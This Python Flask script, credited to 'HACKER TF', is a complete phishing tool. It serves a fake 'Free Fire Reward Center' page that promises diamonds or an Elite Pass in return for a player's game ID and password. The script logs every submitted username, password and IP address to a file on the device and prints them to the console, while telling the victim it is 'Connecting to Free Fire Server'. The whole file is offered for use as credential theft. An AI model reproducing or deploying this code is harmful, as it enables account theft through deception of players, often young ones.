from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Free Fire</title>
    <style>
        body { font-family: sans-serif; background: #1e1e1e; color: white; display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
        .box { background: #2d2d2d; padding: 30px; border-radius: 10px; width: 300px; text-align: center; box-shadow: 0 0 10px #ffcc00; }
        input, select, button { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: none; }
        button { background: #ffcc00; color: black; font-weight: bold; cursor: pointer; }
        h2 { color: #ffcc00; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Free Fire Reward Center</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Free Fire ID or Nickname" required><br>
            <input type="password" name="password" placeholder="Account Password" required><br>
            <select name="reward">
                <option value="100 Diamonds">100 Diamonds</option>
                <option value="Elite Pass">Elite Pass</option>
                <option value="Character Bundle">Character Bundle</option>
                <option value="DJ Alok">DJ Alok</option>
            </select><br>
            <button type="submit">Claim Reward</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    reward = request.form.get('reward')
    ip = request.remote_addr

    log = f"""
[+] Free Fire Login
IP: {ip}
Username: {username}
Password: {password}
Selected Reward: {reward}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Connecting to Free Fire Server...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;33m" + "="*40)
    print("        Made by HACKER TF         ")
    print("     Free Fire Login Capture      ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5088)